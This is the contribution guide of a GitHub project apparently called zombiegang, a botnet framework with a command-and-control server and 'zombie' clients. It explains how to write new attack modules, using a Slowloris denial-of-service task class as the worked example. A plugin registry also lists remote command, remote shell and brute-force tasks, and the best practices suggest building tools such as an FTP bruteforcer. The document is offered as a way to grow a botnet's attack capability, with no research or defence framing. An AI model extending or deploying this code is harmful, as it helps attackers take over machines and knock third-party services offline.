[//]: # (https://github.com/r3nt0n/zombiegang)

# Contribution guidelines

First off, thanks for taking the time to contribute. This guide is ordered from least to most difficult:

1. Starts by explaining **[how to write and add new modules](#how-to-create-new-tools-and-attacks)** in the **clients** (zombie and master), which is enough to create new **tools and attacks**.  
  

2. Next section includes a list of **[best practices](#best-practices)** that will help you better understand how to build and incorporate these modules efficiently.  
  

3. Finally, if you want to go deeper, the last section will help you **[understand the API and database structure](#understanding-the-api-and-db-structure)** to start **contributing to the CC server**, which is the main component.


## How to create new tools and attacks

To follow this tutorial, we are going to take `dos` module as example: 

### zombie side
`zombie-client` includes the class `Task` inside [`🔗app/models/task.py`](https://github.com/r3nt0n/zombiegang/blob/master/zombie-client/app/models/task.py), this is the base class that make all dirty work. It **creates two threads**:
    
+ one thread to **keep checking manual stop signals** from cc-server
+ second thread to the **main execution of the task**:
  + **reports that has read the task** (updates `Missions.read_confirm` field to `true`)  
  + **reports that task is starting** (updates `Missions.running` field to `true`)
  + (here is where the ***custom code*** is executed)
  + **reports that the task has been completed and updates its result and execution time** (updates `Missions.result` and `Missions.exec_at` fields to `Task.result` and `Task.exec_at`)
  + **logging** all this processes in case debug is required

Inherits from this parent class will let you focus on the core of the attack.

First thing we need to do is create [`🔗app/models/attacks/dos.py`](https://github.com/r3nt0n/zombiegang/blob/master/zombie-client/app/models/attacks/dos.py) and import `Task`:


```python
from app.models import Task
```

We are going to create a child class. The `__init__` method takes `task_data` as argument, so you can access all task fields inside your code. Let's initilize the attributes you need with this info to use later.

```python
class DDosAttack(Task):
    def __init__(self, task_data):
        super().__init__(task_data)
        self.attack_type = self.task_content['attack_type']
        self.target = self.task_content['target']
        self.port = int(self.task_content['port'])
```

This are the other two methods you need to set: 

```python
    def start(self):
        # here comes the sugar
        from app.components import logger
        logger.log('starting ddos module...', 'OTHER')

        if self.attack_type == 'slowloris':
            logger.log('starting ddos/slowloris module...', 'OTHER')
            attack = Slowloris(self.target, port=self.port, to_stop_at=self.to_stop_at, enable_https=self.https,
                               n_sockets=1000)
            attack.run()
            logger.log('slowloris executed', 'SUCCESS')
            self.result = attack.report
        Task.start(self)
        # ...

    def run(self):
        return Task.run(self)
```
  
The logic of our task should be included inside `start()`. In the example, it checks for a specific subtype and load a specific module depending on it, then run and take the result from a specific field of the task.  

`run()` method returns the parent method (`Task.run()`), to wrap all our custom execution with pre and post routines common to all tasks (report starting, report result, etc). We don't need to declare anything else in this method.

To complete the code of the example, we are going to add another import:

```python
from app.models import Task
from app.modules.attacks import Slowlowris
```

In this example we are using the module [`🔗app/modules/attacks/slowloris.py`](https://github.com/r3nt0n/zombiegang/blob/master/zombie-client/app/modules/attacks/slowloris.py), which encapsulates the attack logic that address one of DDoS attacks subtypes. **For more information on models and modules, visit the good practices section**.

Once we have created our new model or custom task we need to reference it on two files:

[`🔗app/models/attacks/__init__.py`](https://github.com/r3nt0n/zombiegang/blob/master/zombie-client/app/models/attacks/__init__.py)
```python
from .dos import DDosAttack
``` 
 
[`🔗app/components/plugin_manager.py`](https://github.com/r3nt0n/zombiegang/blob/master/zombie-client/app/components/plugin_manager.py)  
```python
class PluginManager:
    def __init__(self):
        self.plugins = {
            'cmd': tools.Command,
            'rsh': tools.RemoteShellSession,
            'dos': attacks.DDosAttack,
            'brt': attacks.BruteForceAttack
            # include new customized tasks here
            
        }

    def get_plugin(self, task_type):
        Plugin = None
        for plugin in self.plugins:
            if task_type == plugin:
                Plugin = self.plugins[plugin]
                break
        return Plugin
```

Now, when zombie receive a new task and the field `task_type` is `dos`, he runs the code we have just implemented with config provided in `task_content` as parameters and reports cc back on every step.

### master-side

Still under construction [...]


## Best practices

+ Write isolate `modules` which execute individual actions (e.g.: perform an slowloris attack)
+ Think in `models` like a wrapper to converts it into a customized task, within which you can use one or more of these `modules` (e.g.: ddos attacks model)
+ Write this modules reusing as much code as possible, there are available "low-level  modules" like `http_client.py`,`ssh_client.py` or `crud.py` that save you from having to code the same routines over and over again
+ If you are writing a module and identify some routine that could be useful in other cases, try to write also a low-level module (e.g.: you are writing a ftp bruteforcer, first you write the ftp client, which is the "low-level module", and use it to create the ftp bruteforcer module. To complete the example, you would write a model using this module to create a new customized task)

Still under construction [...]

## Understanding the API and DB structure

Still under construction [...]


